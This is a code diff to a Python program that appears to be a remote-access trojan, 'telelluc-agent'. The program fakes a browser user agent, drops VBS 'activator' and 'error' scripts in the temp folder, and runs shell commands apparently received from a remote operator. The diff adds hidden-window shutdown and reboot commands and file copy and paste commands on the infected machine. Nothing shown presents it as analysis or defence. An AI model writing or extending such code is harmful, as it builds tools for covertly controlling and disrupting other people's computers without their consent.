@@ -42,6 +42,7 @@ USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) telelluc-agent"
 device_id = None
 last_command_time = time.time()
 current_working_dir = os.getcwd()
+clipboard_file = None
 
 ERROR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_error.vbs")
 ACTIVATOR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_activator.vbs")
@@ -280,6 +281,7 @@ def show_error():
 
 def execute_shell_command(cmd_str):
     global current_working_dir
+    global clipboard_file
 
     try:
         cmd_lower = cmd_str.lower().strip()
@@ -326,6 +328,24 @@ def execute_shell_command(cmd_str):
         if cmd_lower == "pwd" or cmd_lower == "cd":
             return current_working_dir
 
+        # Handle shutdown command
+        if cmd_lower.startswith("__shutdown__"):
+            try:
+                subprocess.Popen(["shutdown", "/s", "/t", "30", "/c", "System will shutdown in 30 seconds"],
+                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0)
+                return "Shutdown initiated (30 seconds)"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle reboot command
+        if cmd_lower.startswith("__reboot__"):
+            try:
+                subprocess.Popen(["shutdown", "/r", "/t", "30", "/c", "System will reboot in 30 seconds"],
+                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0)
+                return "Reboot initiated (30 seconds)"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
         # Handle nano command
         if cmd_lower.startswith("nano "):
             filename = cmd_str[5:].strip().strip('"').strip("'")
@@ -371,6 +391,46 @@ def execute_shell_command(cmd_str):
                 else:
                     os.remove(full_path)
                     return f"File deleted: {filename}"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle copy command
+        if cmd_lower.startswith("copy "):
+            filename = cmd_str[5:].strip().strip('"').strip("'")
+            try:
+                full_path = os.path.abspath(os.path.join(current_working_dir, filename))
+                if not os.path.exists(full_path):
+                    return f"Error: File not found: {filename}"
+                clipboard_file = full_path
+                return f"Copied: {filename} (ready to paste)"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle paste command
+        if cmd_lower == "paste" or cmd_lower.startswith("paste "):
+            try:
+                if not clipboard_file:
+                    return "Error: Nothing to paste (use 'copy <file>' first)"
+                if not os.path.exists(clipboard_file):
+                    return "Error: Clipboard file no longer exists"
+
+                dest_name = None
+                if cmd_lower.startswith("paste "):
+                    dest_name = cmd_str[6:].strip().strip('"').strip("'")
+                else:
+                    import os.path
+                    dest_name = os.path.basename(clipboard_file)
+
+                dest_path = os.path.abspath(os.path.join(current_working_dir, dest_name))
+
+                if os.path.isdir(clipboard_file):
+                    import shutil
+                    shutil.copytree(clipboard_file, dest_path)
+                    return f"Directory pasted: {dest_name}"
+                else:
+                    import shutil
+                    shutil.copy2(clipboard_file, dest_path)
+                    return f"File pasted: {dest_name}"
             except Exception as e:
                 return f"Error: {str(e)}"
 
